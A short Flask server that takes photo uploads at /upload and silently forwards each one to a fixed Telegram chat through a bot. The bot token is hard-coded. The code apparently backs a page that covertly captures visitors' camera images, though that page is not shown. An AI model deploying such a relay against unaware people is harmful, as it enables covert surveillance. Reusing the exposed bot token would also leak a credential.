from flask import Flask, render_template, request
import telebot
import threading
import os

# Bot setup
BOT_TOKEN = "8257336150:AAGjrGA6AQERkWuKG0hTVAjs_7oTqMzXw14"
CHAT_ID = "6314556756"
bot = telebot.TeleBot(BOT_TOKEN)

app = Flask(__name__)

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/upload', methods=['POST'])
def upload():
    if 'photo' in request.files:
        photo = request.files['photo']

        # Save temporarily
        temp_path = f"temp_{threading.get_ident()}.jpg"
        photo.save(temp_path)

        # Send to Telegram in background
        threading.Thread(target=send_photo, args=(temp_path,)).start()

    return "OK"

def send_photo(path):
    try:
        with open(path, 'rb') as img:
            bot.send_photo(CHAT_ID, img)
    except Exception as e:
        print("❌ Telegram send error:", e)
    finally:
        try:
            os.remove(path)
        except:
            pass

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=10000)
